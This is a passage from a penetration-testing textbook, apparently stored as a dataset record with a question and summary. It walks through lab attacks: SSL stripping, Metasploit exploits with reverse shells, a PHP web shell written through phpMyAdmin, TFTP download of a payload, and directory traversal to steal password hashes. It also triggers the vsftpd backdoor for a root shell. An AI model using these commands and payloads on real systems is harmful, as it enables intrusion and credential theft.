certificates or those\nthat don’t use HTTPS. Though some users did click through and visit the\nsites, a more sophisticated attack would allow us to capture information in\nplaintext without triggering those obvious warnings that the SSL connec-\ntion is compromised. With SSL stripping, we man-in-the-middle the HTTP connection before\nit is redirected to SSL and add SSL functionality before sending the pack-\nets on to the web server. When the web server replies, SSL stripping again\nintercepts the traffic and removes the HTTPS tags before sending the pack-\nets to the client. This technique is illustrated in Figure 7-14. www.facebook.com\nHTTPS response from\nwww.facebook.com\nHTTPS request for\nwww.facebook.com\nHTTP request for\nInternet\nwww.facebook.com\nUbuntu target Kali\nHTTP response from\nwww.facebook.com\nFigure 7-14: SSL stripping attack\nMoxie Marlinspike, the author of SSLstrip, called certificate warnings\nnegative feedback, as opposed to positive feedback that a session is valid, such as\nseeing HTTPS in the browser URL bar. Avoiding this negative feedback is\nCapturing Traffic 173\nmuch more important to an attack’s success than including positive feed-\nback because users are naturally less likely to notice that a URL says HTTP\ninstead of HTTPS than they are a giant certificate warning they have to\nactively click through. SSL stripping avoids the certificate warning by again\nman-in-the-middling the connection. Users typically encounter HTTPS either through clicking links or\nthrough HTTP 302 redirects. Most users don’t enter https://www.facebook.com\nor even http://www.facebook.com into their browsers; they type www.facebook\n.com or sometimes just facebook.com. And that’s why this attack is possible. SSLstrip adds the HTTPS itself and thus the SSL connection between\nFacebook and Kali is valid. SSLstrip just turns the connection back to\nHTTP to send to the original requester. There is no certificate warning. Using SSLstrip\nThe tool SSLstrip implements SSL stripping. Before we start it, we need to set\nan Iptables rule to pass traffic that is headed to port 80 through SSLstrip. We’ll run SSLstrip on port 8080, as shown next, then restart Arpspoof and\nspoof the default gateway. (For instructions, jump back to “Using ARP\nCache Poisoning to Impersonate the Default Gateway” on page 165.)\nroot@kali:# iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080\nNow start SSLstrip, and tell it to listen on port 8080 with the -l flag. root@kali:# sslstrip -l 8080\nNext, browse to a site that uses SSL (try any Internet site that requires\nlogin credentials) from your Linux target, like the Twitter login page shown\nin Figure 7-15. As you can see, HTTP has replaced HTTPS in the address bar. When you log in, your credentials will be reported in plaintext by SSLstrip. (No, my Twitter password isn’t really “password.”)\nThis attack is more sophisticated than a straight SSL man-in-the-middle\nattack. We are able to avoid the certificate warning because the server is\ncompleting an SSL connection with SSLstrip rather than the browser. 2015-12-28 19:16:35,323 SECURE POST Data (twitter.com):\nsession%5Busername_or_email%5D=georgiaweidman&session%5Bpassword%5D=password&s\ncribe_log=&redirect_after_login=%2F&authenticity_token=a26a0faf67c2e11e6738053\nc81beb4b8ffa45c6a\nAs you can see, SSLstrip reports the entered credentials (georgiaweidman:\npassword) in plaintext. 174 Chapter 7\nFigure 7-15: Twitter login page with SSLstrip running\nsummary\nIn this chapter we’ve fiddled with network traffic to create some interesting\nresults. Using various tools and techniques, we were able to intercept traffic\nthat we had no business seeing in a switched network. We used ARP cache\npoisoning to redirect traffic in a switched network to our Kali system and\nDNS cache poisoning to redirect users to our web servers. We used Ettercap\nto automate an SSL man-in-the-middle attack and (assuming that the user\nclicks through a warning) capture sensitive information in plaintext. Finally,\nwe made the attack even more sophisticated by avoiding an invalid certifi-\ncate warning using SSL stripping. Capturing traffic from the local network can glean useful information\nfor our pentest. For example, we were able to capture valid credentials for\nthe FTP server for use in exploitation. Speaking of exploitation, let’s get started. Capturing Traffic 175\nPaRT III\nat taCks\n8\ne xPloitation\nAfter all that preparatory work we finally get to the\nfun stuff: exploitation. In the exploitation phase of\nthe pentest, we run exploits against the vulnerabilities\nwe have discovered to gain access to target systems. Some vulnerabilities, such as the use of default pass-\nwords, are so easy to exploit, it hardly feels like exploi-\ntation at all. Others are much more complicated. In this chapter we’ll look at exploiting the vulnerabilities we identified in\nChapter 6 to gain a foothold in target machines. We’ll return to our friend\nMS08-067 from Chapter 4, now that we have more background about the\nvulnerability. We’ll also exploit an issue in the SLMail POP3 server with a\nMetasploit module. In addition, we’ll piggyback on a previous compromise\nand bypass login on the FTP server on our Linux target. We will exploit\na vulnerability in the TikiWiki install on the Linux target and a couple of\ndefault password issues on an XAMPP install on the Windows target. We’ll\nalso take advantage of a readable and writable NFS share to take control of\nthe SSH keys and log in as a valid user without knowing the password. We\nwill interact with a fragile web server on a nonstandard port to take advan-\ntage of a directory traversal issue and download system files. For a refresher\non how we discovered each of the issues we’ll use for exploitation, refer\nback to Chapter 6. revisiting ms08-067\nWe know from Chapter 6 that the SMB server on our Windows XP target is\nmissing the MS08-067 patch.\n\nThe MS08-067 vulnerability has a good repu-\ntation for successful exploits, and the corresponding Metasploit module is\nranked as great. We used this vulnerability as an example in Chapter 4, but\nthe knowledge we gained in the previous chapters gives us solid evidence\nthat this exploit will result in a compromise. When we viewed the options for the windows/smb/ms08_067_netapi mod-\nule in Chapter 4, we saw the usual RHOST and RPORT as well as SMBPIPE, which\nallows us to set the pipe that our exploit will use. The default is the browser\npipe, though we can also use SRVSRC. In Chapter 4, we ran the Metasploit\nmodule scanner/smb/pipe_auditor to enumerate the listening SMB pipes\nand found that only the browser pipe is available. Thus, we know that the\ndefault SMBPIPE option, BROWSER, is the only one that will work. Metasploit Payloads\nAs we discussed in Chapter 4, payloads allow us to tell an exploited system\nto do things on our behalf. Though many payloads are either bind shells,\nwhich listen on a local port on the target machine, or reverse shells, which\ncall back to a listener on the attack system, other payloads perform specific\nfunctions. For example, if you run the payload osx/armle/vibrate on an iPhone,\nthe phone will vibrate. There are also payloads to add a new user account:\nlinux/x86/adduser for Linux systems and windows/adduser for Windows. We can download and execute a file with windows/download_exec_https or\nexecute a command with windows/exec. We can even use the speech API to\nmake the target say “Pwned” with windows/speak_pwned. Recall that we can see all the payloads available in Metasploit by enter-\ning show payloads at the root of Msfconsole. Enter this command after you\ntell Metasploit to use the windows/smb/ms08_067_netapi module so you can\nsee only payloads that are compatible with the MS08-067 exploit. In Chapter 4, we used windows/shell_reverse_tcp, but looking through the\nlist, we also see a payload called windows/shell/reverse_tcp. windows/shell/reverse_tcp normal Windows Command Shell, Reverse TCP Stager\nwindows/shell_reverse_tcp normal Windows Command Shell, Reverse TCP Inline\n180 Chapter 8\nBoth payloads create Windows command shells using a reverse connec-\ntion (discussed in Chapter 4). The exploited machine will connect back to\nour Kali machine at the IP address and port specified in the payload options. Any of the payloads listed for the windows/smb/ms08_067_netapi will work just\nfine, but in different pentesting scenarios, you may have to get creative. Staged Payloads\nThe windows/shell/reverse_tcp payload is staged. If we use it with the windows/\nsmb/ms08_067_netapi exploit, the string sent to the SMB server to take\ncontrol of the target machine does not contain all of the instructions to\ncreate the reverse shell. Instead, it contains a stager payload with just enough\ninformation to connect back to the attack machine and ask Metasploit for\ninstructions on what to do next. When we launch the exploit, Metasploit\nsets up a handler for the windows/shell/reverse_tcp payload to catch the incom-\ning reverse connection and serve up the rest of the payload—in this case\na reverse shell—then the completed payload is executed, and Metasploit’s\nhandler catches the reverse shell. The amount of memory space available for\na payload may be limited, and some advanced Metasploit payloads can take\nup a lot of space. Staged payloads allow us to use complex payloads without\nrequiring a lot of space in memory. Inline Payloads\nThe windows/shell_reverse_tcp payload is an inline, or single, payload. Its\nexploit string contains all the code necessary to push a reverse shell back\nto the attacker machine. Though inline payloads take up more space\nthan staged payloads, they are more stable and consistent because all\nthe instructions are included in the original exploit string. You can dis-\ntinguish inline and staged payloads by the syntax of their module name. For example, windows/shell/reverse_tcp or windows/meterpreter/bind_tcp are\nstaged, whereas windows/shell_reverse_tcp is inline. Meterpreter\nMeterpreter is a custom payload written for the Metasploit Project. It is\nloaded directly into the memory of an exploited process using a technique\nknown as reflective dll injection. As such, Meterpreter resides entirely in mem-\nory and writes nothing to the disk. It runs inside the memory of the host\nprocess, so it doesn’t need to start a new process that might be noticed by an\nintrusion prevention or intrusion detection system (IPS/IDS). Meterpreter\nalso uses Transport Layer Security (TLS) encryption for communication\nbetween it and Metasploit. You can think of Meterpreter as a kind of shell\nand then some. It has additional useful commands that we can use, such as\nhashdump, which allows us to gain access to local Windows password hashes. (We’ll look at many Meterpreter commands when we study post exploita-\ntion in Chapter 13.)\nExploitation 181\nWe saw in Chapter 4 that Metasploit’s default payload for the windows/\nsmb/ms08_067_netapi is windows/meterpreter/reverse_tcp. Let’s use the windows/\nmeterpreter/reverse_tcp payload with our MS08-067 exploit this time. Our pay-\nload options should be familiar from other reverse payloads we have used\nso far. Let’s set our payload and run the exploit, as shown in Listing 8-1. msf exploit(ms08_067_netapi) > set payload windows/meterpreter/reverse_tcp\npayload => windows/meterpreter/reverse_tcp\nmsf exploit(ms08_067_netapi) > set LHOST 192.168.20.9\nLHOST => 192.168.20.9\nmsf exploit(ms08_067_netapi) > exploit\n[*] Started reverse handler on 192.168.20.9:4444\n[*] Automatically detecting the target... [*] Fingerprint: Windows XP - Service Pack 3 - lang:English\n[*] Selected Target: Windows XP SP3 English (AlwaysOn NX)\n[*] Attempting to trigger the vulnerability... [*] Sending Stage to 192.168.20.10... [*] Meterpreter session 1 opened (192.168.20.9:4444 -> 192.168.20.10:4312) at\n2015-01-12 00:11:58 -0500\nListing 8-1: Exploiting MS08-067 with a Meterpreter payload\nAs the output shows, running this exploit should open a Meterpreter\nsession that we’ll be able to use for post exploitation. exploiting webdaV default Credentials\nIn Chapter 6, we found that the XAMPP installation on our Windows XP\ntarget employs default login credentials for the WebDAV folder used to\nupload files to the web server. This issue allows us to upload our own pages\nto the server with Cadaver, a command line client for WebDAV, which we\nused to verify this vulnerability in Chapter 6. Let’s create a simple test file\nto upload:\nroot@kali:~# cat test.txt\ntest\nNow use Cadaver with the credentials wampp:xampp to authenticate\nwith WebDAV. root@kali:~# cadaver http://192.168.20.10/webdav\nAuthentication required for XAMPP with WebDAV on server `192.168.20.10':\nUsername: wampp\nPassword:\ndav:/webdav/>\nFinally, use WebDAV’s put command to upload our test.txt file to the web\nserver. 182 Chapter 8\ndav:/webdav/> put test.txt\nUploading test.txt to `/webdav/test.txt':\nProgress: [=============================>] 100.0% of 5 bytes succeeded. dav:/webdav/>\nIf you browse to /webdav/test.txt, you should see that we have successfully\nuploaded our text file to the website, as shown in Figure 8-1. Figure 8-1: A file uploaded with WebDAV\nRunning a Script on the Target Web Server\nA text file is not very useful to us; it would be better if we could upload a\nscript and execute it on the web server, allowing us to run commands on\nthe underlying system’s Apache web server. If Apache is installed as a system\nservice, it will have system-level privileges, which we could use to gain maxi-\nmum control over our target. If not, Apache will run with privileges of the\nuser who started it. Either way, you should end up with a good deal of con-\ntrol over the underlying system just by dropping a file on the web server. Let’s start by confirming that our WebDAV user is allowed to upload\nscripts to the server. Because we found phpMyAdmin software on this web\nserver in Chapter 6, we know that the XAMPP software includes PHP. If we\nupload and execute a PHP file, we should be able to run commands on the\nsystem using PHP. dav:/webdav/> put test.php\nUploading test.php to `/webdav/test.php':\nProgress: [=============================>] 100.0% of 5 bytes succeeded. dav:/webdav/>\nnote Some open WebDAV servers allow uploading text files but block script files like .asp or\n.php. Lucky for us, that isn’t the case here, and we successfully uploaded test.php. Uploading a Msfvenom Payload\nIn addition to uploading any PHP scripts we’ve created to perform tasks on\nthe target, we can also use Msfvenom to generate a stand-alone Metasploit\npayload to upload to the server. We used Msfvenom briefly in Chapter 4,\nbut to brush up on syntax, you can enter msfvenom -h for help. When you’re\nready, list all the available payloads with the -l option for PHP payloads, as\nshown in Listing 8-2. Exploitation 183\nroot@kali:~# msfvenom -l payloads\nphp/bind_perlu Listen for a connection and spawn a command\nshell via perl (persistent)\nphp/bind_perl_ipv6 Listen for a connection and spawn a command\nshell via perl (persistent) over IPv6\nphp/bind_php Listen for a connection and spawn a command\nshell via php\nphp/bind_php_ipv6 Listen for a connection and spawn a command\nshell via php (IPv6)\nphp/download_execv Download an EXE from an HTTP URL and execute it\nphp/exec Execute a single system command\nphp/meterpreter/bind_tcpw Listen for a connection over IPv6, Run a\nmeterpreter server in PHP\nphp/meterpreter/reverse_tcp Reverse PHP connect back stager with checks\nfor disabled functions, Run a meterpreter\nserver in PHP\nphp/meterpreter_reverse_tcp Connect back to attacker and spawn a\nMeterpreter server (PHP)\nphp/reverse_perl Creates an interactive shell via perl\nphp/reverse_php Reverse PHP connect back shell with checks\nfor disabled functions\nphp/shell_findsock\nListing 8-2: Metasploit PHP payloads\nMsfvenom gives us a few options: We can download and execute a file on\nthe system v, create a shell u, or even use Meterpreter w. Any of these pay-\nloads will give us control of the system, but let’s use php/meterpreter/reverse_tcp. After we specify a payload, we can use -o to find out which options we need to\nuse with it, as shown here. root@kali:~# msfvenom -p php/meterpreter/reverse_tcp -o\n[*] Options for payload/php/meterpreter/reverse_tcp\n--snip--\nName Current Setting Required Description\n---- --------------- -------- -----------\nLHOST yes The listen address\nLPORT 4444 yes The listen port\nAs you can see we need to set LHOST to tell the payload which IP\naddress to connect back to, and we can also change the LPORT option. Because this payload is already in PHP format, we can output it in the\nraw format with the -f option after we set our options, and then pipe\nthe raw PHP code into a file with the .php extension for posting to the\nserver, as shown here. root@kali:~# msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.20.9\nLPORT=2323 -f raw > meterpreter.php\n184 Chapter 8\nNow we upload the file using WebDAV. dav:/webdav/> put meterpreter.php\nUploading meterpreter.php to `/webdav/meterpreter.php':\nProgress: [=============================>] 100.0% of 1317 bytes succeeded. As in Chapter 4, we need to set up a handler in Msfconsole to catch the\npayload before we execute the script (see Listing 8-3).",
    "question": "What is the process for performing an SSL stripping attack using SSLstrip and how does it differ from a direct SSL man-in-the-middle attack?",
    "summary": "The text explains how to perform DNS cache poisoning and SSL man-in-the-middle attacks using tools like Dnsspoof and Ettercap to intercept and manipulate network traffic. It also covers SSL stripping, which allows attackers to capture sensitive information without triggering certificate warnings. Finally, it details the use of Metasploit and Msfvenom to exploit vulnerabilities, such as the MS08-067 exploit and WebDAV default credentials, to gain control of target systems."
  },
  {
    "start": 60,
    "end": 66,
    "text": "msf > use multi/handler\nmsf exploit(handler) > set payload php/meterpreter/reverse_tcpu\npayload => php/meterpreter/reverse_tcp\nmsf exploit(handler) > set LHOST 192.168.20.9v\nlhost => 192.168.20.9\nmsf exploit(handler) > set LPORT 2323w\nlport => 2323\nmsf exploit(handler) > exploit\n[*] Started reverse handler on 192.168.20.9:2323\n[*] Starting the payload handler... Listing 8-3: Setting up the payload handler\nUse multi/handler in Msfconsole, set the payload to php/meterpreter/\nreverse_tcp u, and set LHOST v and LPORT w appropriately to match the\ngenerated payload. If this process is unfamiliar to you, jump back to the\n“Creating Standalone Payloads with Msfvenom” on page 103. Running the uploaded payload by opening it in a web browser should\nprovide us with a Meterpreter session that we can see when we return to\nMsfconsole, as shown here. [*] Sending stage (39217 bytes) to 192.168.20.10\n[*] Meterpreter session 2 opened (192.168.20.9:2323 -> 192.168.20.10:1301) at\n2015-01-07 17:27:44 -0500\nmeterpreter >\nWe can use the Meterpreter command getuid to see what privileges our\nsession has on the exploited target. Generally speaking, we get the privi-\nleges of the software we exploited. meterpreter > getuid\nBOOKXP\\SYSTEM\nWe now have system privileges, which will allow us to take complete\ncontrol of the Windows system. (It’s generally a bad idea to allow web server\nsoftware to have system privileges for just this reason. Because XAMPP’s\nApache server is running as a system service, we have full access to the\nunderlying system.)\nNow let’s look at another issue with our XAMPP install. Exploitation 185\nexploiting open phpmyadmin\nThe same target XAMPP platform exploited in the previous section also\nincludes an open phpMyAdmin install, which we can exploit to run com-\nmands on the database server. Like Apache, our MySQL server will have\neither system privileges (if it is installed as a Windows service) or the privi-\nleges of the user that started the MySQL process. By accessing the MySQL\ndatabase, we can perform an attack similar to our WebDAV attack and\nupload scripts to the web server using MySQL queries. To explore this attack, first navigate to http://192.168.20.10/phpmyadmin,\nand click the SQL tab at the top. We’ll use MySQL to write a script to the\nweb server that we’ll use to get a remote shell. We’ll use a SQL SELECT\nstatement to output a PHP script to a file on the web server, which will\nallow us to remotely control the target system. We’ll use the script <?php\nsystem($_GET['cmd']); ?> to grab the cmd parameter from the URL and exe-\ncute it using the system() command. The default install location for XAMPP’s Apache on Windows is\nC:\\xampp\\htodcs\\. The syntax for our command is: SELECT \"<script string>\"\ninto outfile \"path_to_file_on_web_server\". Our completed command looks\nlike this:\nSELECT \"<?php system($_GET['cmd']); ?>\" into outfile \"C:\\\\xampp\\\\htdocs\\\\shell.php\"\nnote We use double backslashes to escape, so we don’t end up with the file\nC:xampphtdocsshell.php, which we will not be able to access from\nthe web server. Figure 8-2 shows the command entered into the SQL console in\nphpMyAdmin. Figure 8-2: Executing SQL commands\n186 Chapter 8\nRun the completed query in phpMyAdmin, and then browse to the\nnewly created file, http://192.168.20.10/shell.php. The script should throw the\nerror Warning: system() [function.system]: Cannot execute a blank command in C:\\\nxampp\\htdocs\\shell.php on line 1, because we did not supply an cmd parameter. (Recall from earlier that shell.php grabs the cmd parameter from the URL\nand runs it using the PHP system() command.) We need to supply a cmd\nparameter that tells the script the command we’d like to run on the target\nsystem. For example, we can ask the Windows XP target to tell us its net-\nworking information using ipconfig as the cmd parameter, like so:\nhttp://192.168.20.10/shell.php?cmd=ipconfig\nThe result is shown in Figure 8-3. Figure 8-3: Code execution\nDownloading a File with TFTP\nThe previous steps give us a shell with system privileges, which we “upgrade”\nby uploading a more complicated PHP script. But rather than creating a\nreally long and complicated SQL SELECT query, we can host a file on our\nKali machine and then use our PHP shell to pull it down to the web server. On Linux, we could use wget to download files from the command line. This functionality is painfully absent on Windows, but we can use TFTP on\nWindows XP. Let’s use it to upload meterpreter.php from the previous section. note TFTP is not the only way we can transfer files with noninteractive command line\naccess. In fact, some newer Windows systems do not have TFTP enabled by default. You can also have FTP read settings from a file with the -s option or use a script-\ning language such as Visual Basic or Powershell on the latest Windows operating\nsystems. We can use the Atftpd TFTP server to host files on our Kali system. Start Atftpd in daemon mode, serving files from the location of your\nmeterpreter.php script. root@kali:~# atftpd --daemon --bind-address 192.168.20.9 /tmp\nSet the cmd parameter in the shell.php script as follows:\nhttp://192.168.20.10/shell.php?cmd=tftp 192.168.20.9 get meterpreter.php\nC:\\\\xampp\\\\htdocs\\\\meterpreter.php\nExploitation 187\nThis command should pull down meterpreter.php to the target’s Apache\ndirectory using TFTP, as shown in Figure 8-4. Figure 8-4: Transferring files with TFTP\nNow we can browse to http://192.168.20.10/meterpreter.php to open a\nMeterpreter shell. (Be sure to restart the handler to catch the Meterpreter\nconnection before executing the script.) And as you can see, though we\nused an attack different from uploading a file through WebDAV, we ended\nup in the same place: We have a Meterpreter shell from the web server\nusing its access to the MySQL server to upload files. Now let’s look at attacking the other web server on the Windows XP\nsystem. note This is not the only way we could exploit database access. For example, if you find a\nMicrosoft MS SQL database instead, you may be able to use the xp_cmdshell() func-\ntion, which acts as a built-in system command shell. For security reasons, it is disabled\non newer versions of MS SQL, but a user with administrative privileges should be\nable to reenable it, giving you shell access without having to upload anything. downloading sensitive Files\nRecall from Chapter 6 that our Zervit server on port 3232 has a directory\ntraversal issue that will allow us to download files from the remote system\nwithout authentication. We can download the Windows boot.ini configura-\ntion file (and other files, too) through the browser with the following URL:\nhttp://192.168.20.10:3232/index.html?../../../../../../boot.ini\nWe’ll use this ability to pull files containing password hashes (encrypted\npasswords) for Windows, as well as installed services. Downloading a Configuration File\nThe default install location for XAMPP is C:\\xampp, so we can expect the\ndirectory for FileZilla FTP server to be at C:\\xampp\\FileZillaFtp. A little\nonline research on FileZilla tells us that it stores MD5 hashes of passwords\nin the FileZilla Server.xml configuration file. Depending on the strength of\nthe FTP passwords stored in this file, we may be able to use the MD5 hash\nvalue to recover users’ plaintext FTP passwords. We captured the password for user georgia in Chapter 7, but our target\nmay contain additional accounts. Let’s use the Zervit server to download\nthe FileZilla configuration file from http://192.168.20.10:3232/index.html? ../../../../../../xampp/FileZillaFtp/FileZilla%20Server.xml. (Note that %20 is\n188 Chapter 8\nhex encoding for a space.) You can see some of the contents of the file in\nListing 8-4. <User Name=\"georgia\">\n<Option Name=\"Pass\">5f4dcc3b5aa765d61d8327deb882cf99</Option>\n<Option Name=\"Group\"/>\n<Option Name=\"Bypass server userlimit\">0</Option>\n<Option Name=\"User Limit\">0</Option>\n<Option Name=\"IP Limit\">0</Option>\n--snip--\nListing 8-4: FileZilla FTP configuration file\nAs you can see, the configuration file contains two user accounts (in\nthe User Name fields): georgia and newuser. Now all we have to do is figure\nout their passwords based on the stored hashes. We’ll look at turning password hashes back into plaintext passwords\n(including MD5 hashes) in the next chapter. Downloading the Windows SAM\nSpeaking of passwords, in addition to the FTP user passwords, we can try\npulling down the Windows Security Accounts Manager (SAM) file that stores\nWindows hashes. The SAM file is obfuscated because the Windows Syskey\nutility encrypts the password hashes inside the SAM file with 128-bit Rivest\nCipher 4 (RC4) to provide additional security. Even if an attacker or pen-\ntester is able to gain access to the SAM file, there is a bit more work to do to\nrecover the password hashes. We need a key to reverse the RC4 encryption\non the hashes. The encryption key for the Syskey utility, called the bootkey,\nis stored inside of the Windows SYSTEM file. We need to download both\nthe SAM and SYSTEM files to recover the hashes and attempt to reverse\nthem into plaintext passwords. In Windows XP, these files are located at\nC:\\Windows\\System32\\config, so let’s try downloading the SAM file from the\nfollowing URL:\nhttp://192.168.20.10:3232/index.html?../../../../../../WINDOWS/system32/config/sam\nWhen we try to use Zervit to download this file, we get a “file not\nfound” error. It looks like our Zervit server doesn’t have access to this file. Luckily, Windows XP backs up both the SAM and SYSTEM files to the\nC:\\Windows\\repair directory, and if we try to pull down the files from there,\nZervit is able to serve them. These URLs should do the trick:\nhttp://192.168.20.10:3232/index.html?../../../../../../WINDOWS/repair/system\nhttp://192.168.20.10:3232/index.html?../../../../../../WINDOWS/repair/sam\nnote Like our MD5 hashes, we’ll use the Windows SAM file in the next chapter when we\ncover password attacks in depth. Exploitation 189\nexploiting a Buffer overflow in third-Party software\nIn Chapter 6, we never did find out for sure if the SLMail server on our\nWindows XP target is vulnerable to the POP3 issue CVE-2003-0264. The\nversion number reported by SLMail (5.5) appears to line up with the vul-\nnerability, so let’s try exploiting it. The corresponding Metasploit module,\nwindows/pop3/seattlelab_pass, has a rank of great. (A ranking that high is\nunlikely to crash the service if it fails.)\nWindows/pop3/seattlelab_pass attempts to exploit a buffer overflow in the\nPOP3 server. Using it is similar to setting up the MS08-067 exploit, as shown\nin Listing 8-5.\n\nmsf > use windows/pop3/seattlelab_pass\nmsf exploit(seattlelab_pass) > show payloads\nCompatible Payloads\n===================\nName Disclosure Date Rank Description\n---- --------------- ---- -----------\ngeneric/custom normal Custom Payload\ngeneric/debug_trap normal Generic x86 Debug Trap\n--snip--\nmsf exploit(seattlelab_pass) > set PAYLOAD windows/meterpreter/reverse_tcp\nPAYLOAD => windows/meterpreter/reverse_tcp\nmsf exploit(seattlelab_pass) > show options\nModule options (exploit/windows/pop3/seattlelab_pass):\nName Current Setting Required Description\n---- --------------- -------- -----------\nRHOST 192.168.20.10 yes The target address\nRPORT 110 yes The target port\nPayload options (windows/meterpreter/reverse_tcp):\nName Current Setting Required Description\n---- --------------- -------- -----------\nEXITFUNC thread yes Exit technique: seh, thread, process, none\nLHOST yes The listen address\nLPORT 4444 yes The listen port\nExploit target:\nId Name\n-- ----\n0 Windows NT/2000/XP/2003 (SLMail 5.5)\nmsf exploit(seattlelab_pass) > set RHOST 192.168.20.10\nRHOST => 192.168.20.10\n190 Chapter 8\nmsf exploit(seattlelab_pass) > set LHOST 192.168.20.9\nLHOST => 192.168.20.9\nmsf exploit(seattlelab_pass) > exploit\n[*] Started reverse handler on 192.168.20.9:4444\n[*] Trying Windows NT/2000/XP/2003 (SLMail 5.5) using jmp esp at 5f4a358f\n[*] Sending stage (752128 bytes) to 192.168.20.10\n[*] Meterpreter session 4 opened (192.168.20.9:4444 -> 192.168.20.10:1566) at 2015-01-07\n19:57:22 -0500\nmeterpreter >\nListing 8-5: Exploiting SLMail 5.5 POP3 with Metasploit\nRunning this exploit should give us another Meterpreter session on\nthe Windows XP target—yet another way to take control of the system. (In Chapter 13, which covers post exploitation, we’ll see what to do once\nwe have a Meterpreter session on a target.)\nexploiting third-Party web applications\nIn Chapter 6, we used the Nikto web scanner against our Linux target and\ndiscovered an installation of the TikiWiki CMS software version 1.9.8 with\na code execution vulnerability in the script graph_formula.php. A search for\nTikiWiki in Metasploit returns several modules, as shown in Listing 8-6. msf exploit(seattlelab_pass) > search tikiwiki\nMatching Modules\n================\nName Disclosure Date Rank Description\n---- --------------- ---- -----------\n--snip--\nuexploit/unix/webapp/tikiwiki_graph_formula_exec 2007-10-10 00:00:00 UTC excellent TikiWiki graph_\nformula Remote\nPHP Code\nExecution\nexploit/unix/webapp/tikiwiki_jhot_exec 2006-09-02 00:00:00 UTC excellent TikiWiki jhot\nRemote Command\nExecution\n--snip--\nmsf exploit(seattlelab_pass) > info unix/webapp/tikiwiki_graph_formula_exec\nName: TikiWiki tiki-graph_formula Remote PHP Code Execution\nModule: exploit/unix/webapp/tikiwiki_graph_formula_exec\n--snip--\nTikiWiki (<= 1.9.8) contains a flaw that may allow a remote attacker\nto execute arbitrary PHP code. The issue is due to\n'tiki-graph_formula.php' script not properly sanitizing user input\nsupplied to create_function(), which may allow a remote attacker to\nexecute arbitrary PHP code resulting in a loss of integrity. Exploitation 191\nReferences:\nhttp://cve.mitre.org/cgi-bin/cvename.cgi?name=2007-5423\nhttp://www.osvdb.org/40478v\nhttp://www.securityfocus.com/bid/26006\nListing 8-6: TikiWiki exploit information\nBased on the module names, unix/webapp/tikiwiki_graph_formula_exec u\nlooks like the one we need because it has graph_formula in its name. Our\nassumption is confirmed when we run info on the module. The OSVDB\nnumber v listed in the references for unix/webapp/tikiwiki_graph_formula_\nexec matches our Nikto output from Chapter 6. The options for this module are different from our previous exploit\nexamples, as shown in Listing 8-7. msf exploit(seattlelab_pass) > use unix/webapp/tikiwiki_graph_formula_exec\nmsf exploit(tikiwiki_graph_formula_exec) > show options\nModule options (exploit/unix/webapp/tikiwiki_graph_formula_exec):\nName Current Setting Required Description\n---- --------------- -------- -----------\nProxies no Use a proxy chainu\nRHOST yes The target address\nRPORT 80 yes The target port\nURI /tikiwiki yes TikiWiki directory pathv\nVHOST no HTTP server virtual hostw\nExploit target:\nId Name\n-- ----\n0 Automatic\nmsf exploit(tikiwiki_graph_formula_exec) > set RHOST 192.168.20.11\nRHOST => 192.168.20.11\nListing 8-7: Using the TikiWiki exploit\nWe could set a proxy chain u and/or a virtual host w for the TikiWiki\nserver, but we don’t need to here. We can leave the URI set to the default\nlocation /tikiwiki v. This exploit involves PHP command execution, so naturally, our\npayloads are PHP based. Using the show payloads command (Listing 8-8)\nreveals that we can use PHP-based Meterpreter u as we did in our XAMPP\nexploit. We will also need to set our LHOST option v again. 192 Chapter 8\nmsf exploit(tikiwiki_graph_formula_exec) > set payload php/meterpreter/reverse_tcpu\npayload => php/meterpreter/reverse_tcp\nmsf exploit(tikiwiki_graph_formula_exec) > set LHOST 192.168.20.9v\nLHOST => 192.168.20.110\nmsf exploit(tikiwiki_graph_formula_exec) > exploit\n[*] Started reverse handler on 192.168.20.9:4444\n[*] Attempting to obtain database credentials... [*] The server returned : 200 OK\n[*] Server version : Apache/2.2.9 (Ubuntu) PHP/5.2.6-2ubuntu4.6 with Suhosin-Patch\n[*] TikiWiki database informations :\ndb_tiki : mysql\ndbversion : 1.9\nhost_tiki : localhost\nuser_tiki : tikiw\npass_tiki : tikipassword\ndbs_tiki : tikiwiki\n[*] Attempting to execute our payload... [*] Sending stage (39217 bytes) to 192.168.20.11\n[*] Meterpreter session 5 opened (192.168.20.9:4444 -> 192.168.20.11:54324) at 2015-01-07\n20:41:53 -0500\nmeterpreter >\nListing 8-8: Exploiting TikiWiki with Metasploit\nAs you can see, while exploiting the TikiWiki installation, the Meta-\nsploit module discovered the credentials w for the TikiWiki database. Unfortunately, the MySQL server is not listening on the network, so these\ncredentials cannot be used for additional compromise. Still, we should note\nthem because they might come in handy during post exploitation. exploiting a Compromised service\nWe noted in Chapter 6 that the FTP server on the Linux target serves a ban-\nner for Very Secure FTP 2.3.4, the version replaced with a binary containing\na backdoor. Because the official code was eventually restored by the authors\nof Vsftpd, the only way to find out if the server on our Linux target has the\nbackdoor code is to test it. (We don’t need to worry about potentially crash-\ning the service if it’s not vulnerable: If this server doesn’t have the backdoor\ncode, we’ll just get a login error when we use the smiley face.)\nEnter any username you like, and add a :) at the end (see Listing 8-9). Use anything for the password, as well. If the backdoor is present, it will\ntrigger without valid credentials. root@kali:~# ftp 192.168.20.11\nConnected to 192.168.20.11. 220 (vsFTPd 2.3.4)\nExploitation 193\nName (192.168.20.11:root): georgia:)\n331 Please specify the password. Password:\nListing 8-9: Triggering the Vsftpd backdoor\nWe notice that the login hangs after the password. This tells us that the\nFTP server is still processing our login attempt, and if we query the FTP\nport again, it will continue to respond. Let’s use Netcat to try connecting\nto port 6200, where the root shell should spawn if the backdoor is present. root@kali:~# nc 192.168.20.11 6200\n# whoami\nroot\nSure enough, we have a root shell. Root privileges give us total control of\nour target machine. For example, we can get the system password hashes with\nthe command cat /etc/shadow. Save the password hash for the user georgia\n(georgia:$1$CNp3mty6$|RWcT0/PVYpDKwyaWWkSg/:15640:0:99999:7:::)to a\nfile called linuxpasswords.txt. We will attempt to turn this hash into a plain-\ntext password in Chapter 9. exploiting open nFs shares\nAt this point we know that the Linux target has exported user georgia’s\nhome folder using NFS and that that share is available to anyone without\nthe need for credentials. But this might not carry much security risk if we\ncannot use the access to read or write sensitive files. Recall that when we scanned the NFS mount in Chapter 6, we saw the\n.ssh directory. This directory could contain the user’s private SSH keys as\nwell as keys used for authenticating a user over SSH. Let’s see if we can\nexploit this share. Start by mounting the NFS share on your Kali system. root@kali:~# mkdir /tmp/mount\nroot@kali:~# mount -t nfs -o nolock 192.168.20.11:/export/georgia 